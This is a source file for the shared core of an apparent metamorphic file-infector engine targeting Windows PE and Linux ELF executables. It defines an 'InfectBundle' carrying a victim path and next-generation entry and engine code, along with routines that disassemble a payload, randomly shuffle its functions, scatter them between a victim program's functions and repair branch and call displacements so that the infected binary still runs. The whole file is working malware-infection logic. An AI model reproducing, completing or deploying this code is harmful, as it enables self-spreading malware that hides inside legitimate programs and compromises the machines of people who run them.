// integrator_common.mc — Shared code for MystiqueFall (PE) and LacriMystique (ELF)
//
// Depends on stdlib.mc (transitively via the includer): malloc/free, print,
// read_i32/write_i32, str_len, str_eq, mem_copy, prng_range. Engines include
// stdlib.mc directly; entry.mc gets it via backend_mystc.mc.
//
// Includes lde.mc (provides LDE constants, globals, lde_fill, lde_init, lde)

#include "lde.mc"
#include "../preloader_common.mc"

// =============================================================================
// File Layout
// =============================================================================
//   1. Flags & Sizing Constants (FL_*, scatter work-stack)
//   2. Read/Write & Branch-Detection Helpers
//   3. InfectBundle Struct (engine entry parameter)
//   4. CodeNode Struct & Lookup
//   5. Payload Operations (disassembly, fixup, blocks, scatter, expansion)
// =============================================================================

// =============================================================================
//
// Flags & Sizing Constants Module
//
// CodeNode FL_* flag bits + scatter work-stack sizing constant.
//
// =============================================================================

int FL_SEEN     = 0x001;    // reachable from entry point
int FL_ME       = 0x002;    // payload instruction (not victim)
int FL_FREESRC  = 0x004;    // src buffer was malloc'd, free on cleanup
int FL_IMPORT   = 0x008;    // call to import thunk
int FL_ALIGN    = 0x010;    // alignment padding (NOP/INT3 sled)
int FL_ABSREF   = 0x020;    // contains absolute VA reference (.reloc marked)
int FL_CODEREF  = 0x040;    // target of a code reference (branch dest)
int FL_PICBASE  = 0x080;    // PIC base computation (CALL+0 / POP / SUB)
int FL_PICDATA  = 0x100;    // PIC data access (CALL+0 / POP / ADD)
int FL_BRANCH   = 0x200;    // branch instruction (Jcc/JMP/CALL rel)
int FL_STOP     = 0x400;    // execution stops here (RET/HLT/JMP unconditional)


int WORK_STACK_ENTRIES = 0x20000;      // reachable-block queue depth (131072)
int WORK_STACK_BYTES   = 0x80000;      // WORK_STACK_ENTRIES * 4 (524288)

// =============================================================================
//
// Read/Write & Branch-Detection Helpers Module
//
// =============================================================================

int read_u8(char* buf, int offset) {
    return buf[offset] & 0xFF;
}

int sign_extend_8(int val) {
    val = val & 0xFF;
    if (val >= 0x80) { val = val - 0x100; }
    return val;
}

int get_branch_target(char* code, int rva) {
    int op;
    int op2;
    int pos;
    int disp;
    int pv;

    pos = 0;
    pv = code[pos] & 0xFF;
    while (g_lde_pfx[pv] != 0) {
        pos = pos + 1;
        pv = code[pos] & 0xFF;
    }

    op = code[pos] & 0xFF;
    pos = pos + 1;

    // Short Jcc
    if (op >= 0x70 && op <= 0x7F) {
        disp = sign_extend_8(code[pos] & 0xFF);
        return rva + pos + 1 + disp;
    }

    // LOOP/LOOPE/LOOPNE/JECXZ
    if (op >= 0xE0 && op <= 0xE3) {
        disp = sign_extend_8(code[pos] & 0xFF);
        return rva + pos + 1 + disp;
    }

    // JMP short
    if (op == 0xEB) {
        disp = sign_extend_8(code[pos] & 0xFF);
        return rva + pos + 1 + disp;
    }

    // CALL rel32 (0xE8), JMP rel32 (0xE9)
    if (op == 0xE8) {
        disp = read_i32(code, pos);
        return rva + pos + 4 + disp;
    }
    if (op == 0xE9) {
        disp = read_i32(code, pos);
        return rva + pos + 4 + disp;
    }

    // 0F xx two-byte
    if (op == 0x0F) {
        op2 = code[pos] & 0xFF;
        pos = pos + 1;
        if (op2 >= 0x80 && op2 <= 0x8F) {
            disp = read_i32(code, pos);
            return rva + pos + 4 + disp;
        }
    }

    return -1;
}

int get_branch_disp_size(char* code) {
    int op;
    int pos;
    int pv;

    pos = 0;
    pv = code[pos] & 0xFF;
    while (g_lde_pfx[pv] != 0) {
        pos = pos + 1;
        pv = code[pos] & 0xFF;
    }

    op = code[pos] & 0xFF;

    if (op >= 0x70 && op <= 0x7F) { return 1; }
    if (op == 0xEB) { return 1; }
    if (op >= 0xE0 && op <= 0xE3) { return 1; }
    if (op == 0xE8) { return 4; }
    if (op == 0xE9) { return 4; }

    if (op == 0x0F) {
        op = code[pos + 1] & 0xFF;
        if (op >= 0x80 && op <= 0x8F) { return 4; }
    }

    return 0;
}

int convert_short_to_near(char* code, char* out) {
    int op;

    op = code[0] & 0xFF;

    if (op < 0x70) { return 0; }
    if (op > 0x7F) { return 0; }

    out[0] = 0x0F;
    out[1] = op - 0x70 + 0x80;
    write_i32(out, 2, sign_extend_8(code[1] & 0xFF));
    return 6;
}

// =============================================================================
//
// InfectBundle Module
//
// Top-level parameter passed to an engine's infect_one() call. The entry
// program populates it after compiling the next-gen entry + engine, then
// hands the engine off in RWX with this struct's address patched into the
// engine's g_infect_bundle slot.
//
// =============================================================================

struct InfectBundle {
    char* victim_path;                       // ELF/PE to infect
    int   prng_seed;                         // bundle encryption key seed

    // Pointer into the entry program's decrypted bundle. The engine reads
    // its original (untransformed) entry/engine/payload/genome components
    // via bundle_get(entry_header, BC_*, &sz) at use sites.
    struct BundleHeader* entry_header;

    // Entry program's g_bundle_header_off (snapshot after compile_one(entry,...)
    // in integrator_entry.mc). The engine writes this into its own
    // g_bundle_header_off before infecting so the new binary's header pointer
    // lands at the right .data slot for the entry program's layout.
    int   entry_bundle_header_off;

    // Runtime products of entry.mc's compile_one calls (not on-disk).
    char* entry_pic_data;                    // compiled entry, scattered into victim .text
    int   entry_pic_size;
    char* new_entry_mcb_data;                // CF_EMIT_MC of entry, embedded in new bundle
    int   new_entry_mcb_size;
    char* new_engine_mcb_data;               // CF_EMIT_MC of engine, embedded in new bundle
    int   new_engine_mcb_size;
    char* new_payload_mcb_data;              // CF_EMIT_MC of payload, embedded in new bundle (0 = use original)
    int   new_payload_mcb_size;
};

// =============================================================================
//
// CodeNode Module
//
// Struct definition + constructors, list freeing, range/exact lookups,
// branch-link resolution.
//
// =============================================================================

struct CodeNode {
    int flags;
    int len;
    char* src;
    int oldrva;
    int newrva;
    int newofs;
    int target_rva;
    struct CodeNode* link;
    struct CodeNode* next;
    struct CodeNode* prev;
    int arg1;
    int arg2;
    int al;
    int n_data_fixups;
    int* data_fixup_rel;
    int* data_fixup_doff;
    int n_iat_fixups;
    int* iat_fixup_rel;
    int* iat_fixup_idx;
    int n_call_fixups;
    int* call_fixup_rel;
    int* call_fixup_target;
    int n_faddr_fixups;
    int* faddr_fixup_rel;
    int* faddr_fixup_target;
};

struct CodeNode* new_code_node() {
    struct CodeNode* n;
    n = malloc(100);
    n->flags = 0;
    n->len = 0;
    n->src = 0;
    n->oldrva = 0;
    n->newrva = 0;
    n->newofs = 0;
    n->target_rva = -1;
    n->link = 0;
    n->next = 0;
    n->prev = 0;
    n->arg1 = 0;
    n->arg2 = 0;
    n->al = 0;
    n->n_data_fixups = 0;
    n->data_fixup_rel = 0;
    n->data_fixup_doff = 0;
    n->n_iat_fixups = 0;
    n->iat_fixup_rel = 0;
    n->iat_fixup_idx = 0;
    n->n_call_fixups = 0;
    n->call_fixup_rel = 0;
    n->call_fixup_target = 0;
    n->n_faddr_fixups = 0;
    n->faddr_fixup_rel = 0;
    n->faddr_fixup_target = 0;
    return n;
}

void free_chain(struct CodeNode* head) {
    struct CodeNode* cur;
    struct CodeNode* nxt;
    cur = head;
    while (cur != 0) {
        nxt = cur->next;
        if ((cur->flags & FL_FREESRC) != 0 && cur->src != 0) {
            free(cur->src);
        }
        if (cur->data_fixup_rel != 0) { free(cur->data_fixup_rel); }
        if (cur->data_fixup_doff != 0) { free(cur->data_fixup_doff); }
        if (cur->iat_fixup_rel != 0) { free(cur->iat_fixup_rel); }
        if (cur->iat_fixup_idx != 0) { free(cur->iat_fixup_idx); }
        free(cur);
        cur = nxt;
    }
}

// Range search: find the CodeNode whose oldrva range [oldrva, oldrva+len) contains
// the given address. Skips payload (FL_ME) nodes.
struct CodeNode* find_node_by_oldrva(struct CodeNode* head, int old_rva) {
    struct CodeNode* t;
    int match_len;
    t = head;
    while (t != 0) {
        if ((t->flags & FL_ME) == 0 && t->oldrva != 0) {
            match_len = t->len;
            if (t->al > 0) { match_len = t->al; }
            if (old_rva >= t->oldrva && old_rva < t->oldrva + match_len) {
                return t;
            }
        }
        t = t->next;
    }
    return 0;
}

// For each FL_BRANCH node, find the target CodeNode and record it on ->link.
// Origin-aware: victim branches only link to victim nodes, payload branches
// only link to payload nodes (prevents cross-origin links that would rewrite
// a branch target to code from a different trust domain).  Fallback range
// search applies only to victim branches, since find_node_by_oldrva above
// intentionally skips FL_ME (payload) nodes.
void resolve_branch_links(struct CodeNode* head) {
    struct CodeNode* c;
    struct CodeNode* t;
    int is_scatter;

    c = head;
    while (c != 0) {
        if ((c->flags & FL_BRANCH) != 0 && c->target_rva >= 0) {
            is_scatter = (c->flags & FL_ME) != 0;
            // Exact match first — only within same origin
            t = head;
            while (t != 0) {
                if (t->oldrva == c->target_rva && ((t->flags & FL_ME) != 0) == is_scatter) {
                    c->link = t;
                    t->flags = t->flags | FL_CODEREF;
                    break;
                }
                t = t->next;
            }
            // Fallback: range search (victim-only)
            if (c->link == 0 && is_scatter == 0) {
                t = find_node_by_oldrva(head, c->target_rva);
                if (t != 0) {
                    c->link = t;
                    t->flags = t->flags | FL_CODEREF;
                }
            }
        }
        c = c->next;
    }
}

// Strict node lookup: exact oldrva match first, then range match restricted
// to FL_SEEN nodes (boundaries verified by recursive descent). Gap-parsed
// nodes are excluded from range matching because LDE linear scan can
// misparse instruction boundaries.
struct CodeNode* find_node_strict(struct CodeNode* head, int old_rva) {
    struct CodeNode* t;
    int match_len;

    t = head;
    while (t != 0) {
        if ((t->flags & FL_ME) == 0 && t->oldrva == old_rva) {
            return t;
        }
        t = t->next;
    }

    t = head;
    while (t != 0) {
        if ((t->flags & FL_ME) == 0 && (t->flags & FL_SEEN) != 0 && t->oldrva != 0) {
            match_len = t->len;
            if (t->al > 0) { match_len = t->al; }
            if (old_rva >= t->oldrva && old_rva < t->oldrva + match_len) {
                return t;
            }
        }
        t = t->next;
    }
    return 0;
}

// Exact-only victim lookup: used for jump-table targets and function entries
// where the address must be at an instruction boundary.
struct CodeNode* find_node_exact(struct CodeNode* head, int old_rva) {
    struct CodeNode* t;
    t = head;
    while (t != 0) {
        if ((t->flags & FL_ME) == 0 && t->oldrva == old_rva) {
            return t;
        }
        t = t->next;
    }
    return 0;
}

// =============================================================================
//
// Payload Operations Module
//
// Disassembly of abs output, scatter fixups (CALL rel32, FUNC_ADDR),
// function counting/shuffle, scatter insertion + offset assignment,
// short-jump expansion, branch-link resolution.
//
// =============================================================================

// Parse abs output (36-byte header + fixup tables + code + data + extern_info).
// LDE-disassembles code, assigns per-node fixup metadata.
// Returns CodeNode chain; caller gets data/extern_info via out params.
struct CodeNode* disassemble_abs_scatter(
    char* abs_data, int abs_size,
    int* out_entry_off,
    int* out_code_size,
    char** out_data_ptr,
    int* out_data_size,
    char** out_extern_info_ptr,
    int* out_extern_count,
    int* out_count)
{
    int entry_off;
    int code_size;
    int data_size;
    int n_data_fix;
    int n_iat_fix;
    int extern_count;
    int extern_info_sz;
    int* df_code_off;
    int* df_data_off;
    int* ef_code_off;
    int* ef_slot;
    int n_call_fix;
    int n_faddr_fix;
    int* cf_code_off;
    int* cf_target;
    int* ff_code_off;
    int* ff_target;
    int fix_start;
    int iat_fix_start;
    int call_fix_start;
    int faddr_fix_start;
    int code_start;
    char* code;
    int off;
    int len;
    int flags;
    struct CodeNode* head;
    struct CodeNode* tail;
    struct CodeNode* c;
    int count;
    int i;
    int j;
    int node_start;
    int node_end;
    int first_byte;
    int modrm_reg;
    int ndf;
    int nef;
    int ncf;
    int nff;

    if (abs_size < 36) {
        print("ERR: abs output too small\n");
        *out_count = 0;
        return 0;
    }

    // Parse 36-byte header
    entry_off = read_i32(abs_data, 0);
    code_size = read_i32(abs_data, 4);
    data_size = read_i32(abs_data, 8);
    n_data_fix = read_i32(abs_data, 12);
    n_iat_fix = read_i32(abs_data, 16);
    n_call_fix = read_i32(abs_data, 20);
    n_faddr_fix = read_i32(abs_data, 24);
    extern_count = read_i32(abs_data, 28);
    extern_info_sz = read_i32(abs_data, 32);

    fix_start = 36;
    iat_fix_start = fix_start + n_data_fix * 8;
    call_fix_start = iat_fix_start + n_iat_fix * 8;
    faddr_fix_start = call_fix_start + n_call_fix * 8;
    code_start = faddr_fix_start + n_faddr_fix * 8;

    if (code_start + code_size + data_size > abs_size) {
        print("ERR: abs output truncated\n");
        *out_count = 0;
        return 0;
    }

    print("  Abs payload: entry=");
    print_int(entry_off);
    print(" code=");
    print_int(code_size);
    print(" data=");
    print_int(data_size);
    print(" fix=");
    print_int(n_data_fix);
    print("+");
    print_int(n_iat_fix);
    print("+");
    print_int(n_call_fix);
    print("+");
    print_int(n_faddr_fix);
    print(" ext=");
    print_int(extern_count);
    print("\n");

    *out_entry_off = entry_off;
    *out_code_size = code_size;
    *out_data_size = data_size;
    *out_data_ptr = abs_data + code_start + code_size;
    *out_extern_info_ptr = abs_data + code_start + code_size + data_size;
    *out_extern_count = extern_count;

    // Read fixup tables into arrays
    df_code_off = 0;
    df_data_off = 0;
    if (n_data_fix > 0) {
        df_code_off = malloc(n_data_fix * 4);
        df_data_off = malloc(n_data_fix * 4);
        i = 0;
        while (i < n_data_fix) {
            df_code_off[i] = read_i32(abs_data, fix_start + i * 8);
            df_data_off[i] = read_i32(abs_data, fix_start + i * 8 + 4);
            i = i + 1;
        }
    }
    ef_code_off = 0;
    ef_slot = 0;
    if (n_iat_fix > 0) {
        ef_code_off = malloc(n_iat_fix * 4);
        ef_slot = malloc(n_iat_fix * 4);
        i = 0;
        while (i < n_iat_fix) {
            ef_code_off[i] = read_i32(abs_data, iat_fix_start + i * 8);
            ef_slot[i] = read_i32(abs_data, iat_fix_start + i * 8 + 4);
            i = i + 1;
        }
    }
    cf_code_off = 0;
    cf_target = 0;
    if (n_call_fix > 0) {
        cf_code_off = malloc(n_call_fix * 4);
        cf_target = malloc(n_call_fix * 4);
        i = 0;
        while (i < n_call_fix) {
            cf_code_off[i] = read_i32(abs_data, call_fix_start + i * 8);
            cf_target[i] = read_i32(abs_data, call_fix_start + i * 8 + 4);
            i = i + 1;
        }
    }
    ff_code_off = 0;
    ff_target = 0;
    if (n_faddr_fix > 0) {
        ff_code_off = malloc(n_faddr_fix * 4);
        ff_target = malloc(n_faddr_fix * 4);
        i = 0;
        while (i < n_faddr_fix) {
            ff_code_off[i] = read_i32(abs_data, faddr_fix_start + i * 8);
            ff_target[i] = read_i32(abs_data, faddr_fix_start + i * 8 + 4);
            i = i + 1;
        }
    }

    // LDE-disassemble code section
    code = abs_data + code_start;
    head = 0;
    tail = 0;
    count = 0;
    off = 0;

    while (off < code_size) {
        flags = 0;
        len = lde(code + off, &flags);

        if (len == 0) {
            // LDE couldn't decode — emit 1 byte and continue
            c = new_code_node();
            c->src = malloc(1);
            c->src[0] = code[off];
            c->flags = FL_ME | FL_FREESRC;
            c->len = 1;
            c->oldrva = off;
            if (head == 0) { head = c; tail = c; }
            else { tail->next = c; c->prev = tail; tail = c; }
            count = count + 1;
            off = off + 1;
            continue;
        }
        if (off + len > code_size) {
            len = code_size - off;
            c = new_code_node();
            c->src = malloc(len);
            mem_copy(c->src, code + off, len);
            c->flags = FL_ME | FL_FREESRC;
            c->len = len;
            c->oldrva = off;
            if (head == 0) { head = c; tail = c; }
            else { tail->next = c; c->prev = tail; tail = c; }
            count = count + 1;
            break;
        }

        c = new_code_node();
        c->src = malloc(len);
        mem_copy(c->src, code + off, len);
        c->flags = FL_ME | FL_FREESRC;
        c->len = len;
        c->oldrva = off;

        // Classify
        if ((flags & 0x20) != 0) { c->flags = c->flags | FL_BRANCH; }
        if ((flags & 0x40) != 0) { c->flags = c->flags | FL_STOP; }

        // Indirect JMP
        first_byte = code[off] & 0xFF;
        if (first_byte == 0xFF && len >= 2) {
            modrm_reg = (code[off + 1] >> 3) & 0x7;
            if (modrm_reg == 4 || modrm_reg == 5) { c->flags = c->flags | FL_STOP; }
        }

        // Branch target
        if ((c->flags & FL_BRANCH) != 0) {
            c->target_rva = get_branch_target(code + off, off);
        }

        // Assign data fixups
        node_start = off;
        node_end = off + len;
        ndf = 0;
        i = 0;
        while (i < n_data_fix) {
            if (df_code_off[i] >= node_start && df_code_off[i] < node_end) {
                ndf = ndf + 1;
            }
            i = i + 1;
        }
        if (ndf > 0) {
            c->n_data_fixups = ndf;
            c->data_fixup_rel = malloc(ndf * 4);
            c->data_fixup_doff = malloc(ndf * 4);
            j = 0;
            i = 0;
            while (i < n_data_fix) {
                if (df_code_off[i] >= node_start && df_code_off[i] < node_end) {
                    c->data_fixup_rel[j] = df_code_off[i] - node_start;
                    c->data_fixup_doff[j] = df_data_off[i];
                    j = j + 1;
                }
                i = i + 1;
            }
        }

        // Assign IAT/extern fixups
        nef = 0;
        i = 0;
        while (i < n_iat_fix) {
            if (ef_code_off[i] >= node_start && ef_code_off[i] < node_end) {
                nef = nef + 1;
            }
            i = i + 1;
        }
        if (nef > 0) {
            c->n_iat_fixups = nef;
            c->iat_fixup_rel = malloc(nef * 4);
            c->iat_fixup_idx = malloc(nef * 4);
            j = 0;
            i = 0;
            while (i < n_iat_fix) {
                if (ef_code_off[i] >= node_start && ef_code_off[i] < node_end) {
                    c->iat_fixup_rel[j] = ef_code_off[i] - node_start;
                    c->iat_fixup_idx[j] = ef_slot[i];
                    j = j + 1;
                }
                i = i + 1;
            }
        }

        // Assign call fixups (internal CALL rel32)
        ncf = 0;
        i = 0;
        while (i < n_call_fix) {
            if (cf_code_off[i] >= node_start && cf_code_off[i] < node_end) {
                ncf = ncf + 1;
            }
            i = i + 1;
        }
        if (ncf > 0) {
            c->n_call_fixups = ncf;
            c->call_fixup_rel = malloc(ncf * 4);
            c->call_fixup_target = malloc(ncf * 4);
            j = 0;
            i = 0;
            while (i < n_call_fix) {
                if (cf_code_off[i] >= node_start && cf_code_off[i] < node_end) {
                    c->call_fixup_rel[j] = cf_code_off[i] - node_start;
                    c->call_fixup_target[j] = cf_target[i];
                    j = j + 1;
                }
                i = i + 1;
            }
        }

        // Assign FUNC_ADDR fixups (CALL $+0; POP; ADD imm32)
        nff = 0;
        i = 0;
        while (i < n_faddr_fix) {
            if (ff_code_off[i] >= node_start && ff_code_off[i] < node_end) {
                nff = nff + 1;
            }
            i = i + 1;
        }
        if (nff > 0) {
            c->n_faddr_fixups = nff;
            c->faddr_fixup_rel = malloc(nff * 4);
            c->faddr_fixup_target = malloc(nff * 4);
            j = 0;
            i = 0;
            while (i < n_faddr_fix) {
                if (ff_code_off[i] >= node_start && ff_code_off[i] < node_end) {
                    c->faddr_fixup_rel[j] = ff_code_off[i] - node_start;
                    c->faddr_fixup_target[j] = ff_target[i];
                    j = j + 1;
                }
                i = i + 1;
            }
        }

        if (head == 0) { head = c; tail = c; }
        else { tail->next = c; c->prev = tail; tail = c; }
        count = count + 1;
        off = off + len;
    }

    if (df_code_off != 0) { free(df_code_off); free(df_data_off); }
    if (ef_code_off != 0) { free(ef_code_off); free(ef_slot); }
    if (cf_code_off != 0) { free(cf_code_off); free(cf_target); }
    if (ff_code_off != 0) { free(ff_code_off); free(ff_target); }

    *out_count = count;
    return head;
}

// Fix internal CALL rel32 fixups after scatter.
// Each FL_ME node may carry call_fixup entries: (rel, target_code_offset) pairs.
// After scatter, nodes have new positions (newrva/newofs), so CALL rel32
// displacements must be recomputed: disp = target->newrva - (call_rva + 4).
void fix_scatter_call_fixups(char* out, int text_file_off, struct CodeNode* head) {
    struct CodeNode* c;
    struct CodeNode* t;
    int i;
    int target_off;
    int call_rva;
    int disp;
    int count;
    int missed;

    count = 0;
    missed = 0;
    c = head;
    while (c != 0) {
        if ((c->flags & FL_ME) != 0 && c->n_call_fixups > 0) {
            i = 0;
            while (i < c->n_call_fixups) {
                target_off = c->call_fixup_target[i];
                // Find target FL_ME node with matching oldrva
                t = head;
                while (t != 0) {
                    if ((t->flags & FL_ME) != 0 && t->oldrva == target_off) {
                        break;
                    }
                    t = t->next;
                }
                if (t != 0) {
                    call_rva = c->newrva + c->call_fixup_rel[i];
                    disp = t->newrva - (call_rva + 4);
                    write_i32(out, text_file_off + c->newofs + c->call_fixup_rel[i], disp);
                    count = count + 1;
                } else {
                    missed = missed + 1;
                }
                i = i + 1;
            }
        }
        c = c->next;
    }
    if (count > 0 || missed > 0) {
        print("  Fixed ");
        print_int(count);
        print(" internal CALL fixups");
        if (missed > 0) {
            print(" (MISSED ");
            print_int(missed);
            print(")");
        }
        print("\n");
    }
}

// Fix FUNC_ADDR fixups (CALL $+0; POP rd; ADD rd, imm32) after scatter.
// Layout: E8 00 00 00 00 [POP rd] [81 C0+rd] [imm32]
// POP is 5 bytes into the sequence. imm32 is at fixup_rel.
// After scatter: imm32 = target->newrva - (node->newrva + fixup_rel - 3)
// because POP address = node_addr + fixup_rel - 3 (POP is 3 bytes before imm32)
void fix_scatter_faddr_fixups(char* out, int text_file_off, struct CodeNode* head) {
    struct CodeNode* c;
    struct CodeNode* t;
    int i;
    int target_off;
    int pop_rva;
    int imm32;
    int count;

    count = 0;
    c = head;
    while (c != 0) {
        if ((c->flags & FL_ME) != 0 && c->n_faddr_fixups > 0) {
            i = 0;
            while (i < c->n_faddr_fixups) {
                target_off = c->faddr_fixup_target[i];
                // Find target FL_ME node with matching oldrva
                t = head;
                while (t != 0) {
                    if ((t->flags & FL_ME) != 0 && t->oldrva == target_off) {
                        break;
                    }
                    t = t->next;
                }
                if (t != 0) {
                    // POP address = 3 bytes before the imm32
                    pop_rva = c->newrva + c->faddr_fixup_rel[i] - 3;
                    imm32 = t->newrva - pop_rva;
                    write_i32(out, text_file_off + c->newofs + c->faddr_fixup_rel[i], imm32);
                    count = count + 1;
                }
                i = i + 1;
            }
        }
        c = c->next;
    }
    if (count > 0) {
        print("  Fixed ");
        print_int(count);
        print(" FUNC_ADDR fixups\n");
    }
}

// True iff this node's instruction ends a function (RET / RET imm16).
// Used by the *_functions sibling helpers below for function-granular
// integration. The boundary set is a strict subset of FL_STOP (which also
// triggers on JMP / HLT, not safe as function-end markers).
int is_function_end(struct CodeNode* c) {
    if (c == 0 || c->src == 0 || c->len < 1) { return 0; }
    if ((c->src[0] & 0xFF) == 0xC3) { return 1; }   // RET
    if ((c->src[0] & 0xFF) == 0xC2) { return 1; }   // RET imm16
    return 0;
}

// Count function-sized chunks in a payload chain (split at RET nodes).
// The trailing tail past the last RET counts as one extra chunk so it
// doesn't get lost during slicing.
int count_scatter_functions(struct CodeNode* head) {
    struct CodeNode* c;
    int count;
    int tail;

    if (head == 0) { return 0; }
    count = 0;
    tail = 0;
    c = head;
    while (c != 0) {
        tail = 1;
        if (is_function_end(c) != 0) {
            count = count + 1;
            tail = 0;
        }
        c = c->next;
    }
    if (tail != 0) { count = count + 1; }
    return count;
}

// Count function boundaries in victim chain (RET nodes).
int count_victim_functions(struct CodeNode* head) {
    struct CodeNode* c;
    int count;

    if (head == 0) { return 0; }
    count = 0;
    c = head;
    while (c != 0) {
        if (is_function_end(c) != 0) {
            count = count + 1;
        }
        c = c->next;
    }
    return count;
}

// Remove FL_ALIGN padding nodes from chain. Returns new head.
struct CodeNode* remove_padding(struct CodeNode* head) {
    struct CodeNode* c;
    struct CodeNode* nxt;
    struct CodeNode* new_head;

    new_head = head;
    c = head;
    while (c != 0) {
        nxt = c->next;
        if ((c->flags & FL_ALIGN) != 0 && (c->flags & FL_ABSREF) == 0) {
            if (c->prev != 0) {
                c->prev->next = c->next;
            } else {
                new_head = c->next;
            }
            if (c->next != 0) {
                c->next->prev = c->prev;
            }
            if ((c->flags & FL_FREESRC) != 0 && c->src != 0) {
                free(c->src);
            }
            free(c);
        }
        c = nxt;
    }

    return new_head;
}

// Shuffle payload functions (Fisher-Yates). Functions are delimited by RET.
// Slices the chain on RET boundaries (whole functions) rather than every
// basic-block terminator, then Fisher-Yates the function order. A trailing
// segment after the last RET is preserved as its own unit.
struct CodeNode* shuffle_scatter_functions(struct CodeNode* head) {
    struct CodeNode** starts;
    struct CodeNode** ends;
    int n_funcs;
    int i;
    int j;
    struct CodeNode* c;
    struct CodeNode* fn_start;
    struct CodeNode* tmp_s;
    struct CodeNode* tmp_e;

    if (head == 0) { return head; }

    n_funcs = count_scatter_functions(head);
    if (n_funcs < 2) { return head; }

    starts = malloc(n_funcs * 4);
    ends = malloc(n_funcs * 4);

    // Collect function start/end pointers (end = last node of the function,
    // either a RET or the trailing-segment final node).
    i = 0;
    fn_start = head;
    c = head;
    while (c != 0) {
        if (is_function_end(c) != 0) {
            starts[i] = fn_start;
            ends[i] = c;
            i = i + 1;
            fn_start = c->next;
        }
        c = c->next;
    }
    if (fn_start != 0 && i < n_funcs) {
        // Trailing segment without a closing RET (data, padding, etc.)
        c = fn_start;
        while (c->next != 0) { c = c->next; }
        starts[i] = fn_start;
        ends[i] = c;
        i = i + 1;
    }

    // Fisher-Yates shuffle
    i = n_funcs - 1;
    while (i > 0) {
        j = prng_range(i + 1);
        if (j != i) {
            tmp_s = starts[i]; starts[i] = starts[j]; starts[j] = tmp_s;
            tmp_e = ends[i]; ends[i] = ends[j]; ends[j] = tmp_e;
        }
        i = i - 1;
    }

    // Relink in shuffled order
    i = 0;
    while (i < n_funcs) {
        starts[i]->prev = 0;
        if (i > 0) {
            ends[i - 1]->next = starts[i];
            starts[i]->prev = ends[i - 1];
        }
        i = i + 1;
    }
    ends[n_funcs - 1]->next = 0;

    head = starts[0];
    free(starts);
    free(ends);
    return head;
}

// Mistfall scatter: insert payload functions into victim chain at victim RETs.
// Insertion points are restricted to victim function boundaries, and payload is
// chunked into whole functions (RET-delimited) so each insertion drops N
// complete payload functions in a row.
int insert_scatter_functions(struct CodeNode* victim_head, struct CodeNode* scatter_head) {
    struct CodeNode* vc;
    struct CodeNode* pay;
    struct CodeNode* blk_end;
    struct CodeNode* pay_next;
    struct CodeNode* vnext;
    int fn_count;
    int inserted;
    int jitter;
    int victim_fns;
    int scatter_fns;
    int remaining_pay;
    int remaining_slots;
    int funcs_here;
    int avg_jitter;
    int num_slots;
    int bi;

    victim_fns = count_victim_functions(victim_head);
    scatter_fns = count_scatter_functions(scatter_head);

    // Sanity guard: too few victim functions, or payload swamps victim →
    // append instead. Thresholds are looser than the BB version since
    // function granularity gives ~5-10x fewer slots overall.
    if (victim_fns < 3 || scatter_fns > victim_fns * 5) {
        vc = victim_head;
        while (vc->next != 0) { vc = vc->next; }
        vc->next = scatter_head;
        scatter_head->prev = vc;
        print("  (payload appended — victim too small for function-granular scatter)\n");
        return 1;
    }

    avg_jitter = 2;
    num_slots = victim_fns / avg_jitter;
    if (num_slots < 1) { num_slots = 1; }

    pay = scatter_head;
    fn_count = 0;
    inserted = 0;
    remaining_pay = scatter_fns;
    remaining_slots = num_slots;

    vc = victim_head;
    while (vc != 0 && pay != 0) {
        if (is_function_end(vc) != 0) {
            fn_count = fn_count + 1;

            jitter = prng_range(3) + 1;
            if (fn_count >= jitter && vc->next != 0) {
                if (remaining_slots > 0) {
                    funcs_here = remaining_pay / remaining_slots;
                } else {
                    funcs_here = remaining_pay;
                }
                if (funcs_here < 1) { funcs_here = 1; }

                // Walk forward through `funcs_here` payload functions
                bi = 0;
                blk_end = pay;
                while (bi < funcs_here && blk_end != 0) {
                    if (is_function_end(blk_end) != 0) {
                        bi = bi + 1;
                        if (bi >= funcs_here) { break; }
                    }
                    if (blk_end->next != 0) {
                        blk_end = blk_end->next;
                    } else {
                        break;
                    }
                }

                pay_next = blk_end->next;
                if (pay_next != 0) { pay_next->prev = 0; }
                blk_end->next = 0;

                vnext = vc->next;
                vc->next = pay;
                pay->prev = vc;
                blk_end->next = vnext;
                if (vnext != 0) { vnext->prev = blk_end; }

                inserted = inserted + 1;
                remaining_pay = remaining_pay - bi;
                remaining_slots = remaining_slots - 1;
                pay = pay_next;
                fn_count = 0;
                vc = vnext;
                continue;
            }
        }
        vc = vc->next;
    }

    // Append remaining payload at end
    if (pay != 0) {
        vc = victim_head;
        while (vc->next != 0) { vc = vc->next; }
        vc->next = pay;
        pay->prev = vc;
    }

    return inserted;
}

// Assign new offsets (newrva, newofs) to all nodes. Returns total size.
int assign_offsets(struct CodeNode* head, int base_rva) {
    struct CodeNode* c;
    int off;

    off = 0;
    c = head;
    while (c != 0) {
        c->newrva = base_rva + off;
        c->newofs = off;
        off = off + c->len;
        c = c->next;
    }
    return off;
}

// Iteratively expand short jumps that can't reach their target after code scattering.
// Returns total number of expansions.
int expand_short_jumps(struct CodeNode* head, int base_rva) {
    int expanded;
    int total_expanded;
    int disp_sz;
    int disp;
    int op;
    char cvt_buf[8];
    int new_len;
    char* new_src;
    struct CodeNode* c;

    total_expanded = 0;

    expanded = 1;
    while (expanded > 0) {
        assign_offsets(head, base_rva);

        expanded = 0;
        c = head;
        while (c != 0) {
            if ((c->flags & FL_BRANCH) != 0 && c->link != 0) {
                disp_sz = get_branch_disp_size(c->src);
                if (disp_sz == 1) {
                    disp = c->link->newrva - (c->newrva + c->len);
                    if (disp < -0x80 || disp > 0x7F) {
                        op = c->src[0] & 0xFF;
                        if (op >= 0x70 && op <= 0x7F) {
                            // Short Jcc -> near Jcc (6 bytes)
                            new_len = convert_short_to_near(c->src, cvt_buf);
                            if (new_len == 6) {
                                new_src = malloc(6);
                                mem_copy(new_src, cvt_buf, 6);
                                if ((c->flags & FL_FREESRC) != 0) { free(c->src); }
                                c->src = new_src;
                                c->len = 6;
                                c->flags = c->flags | FL_FREESRC;
                                expanded = expanded + 1;
                            }
                        }
                        if (op == 0xEB) {
                            // JMP short -> JMP near (5 bytes)
                            new_src = malloc(5);
                            new_src[0] = 0xE9;
                            write_i32(new_src, 1, 0);
                            if ((c->flags & FL_FREESRC) != 0) { free(c->src); }
                            c->src = new_src;
                            c->len = 5;
                            c->flags = c->flags | FL_FREESRC;
                            expanded = expanded + 1;
                        }
                    }
                }
            }
            c = c->next;
        }

        total_expanded = total_expanded + expanded;
    }

    // Final offset assignment
    assign_offsets(head, base_rva);

    return total_expanded;
}

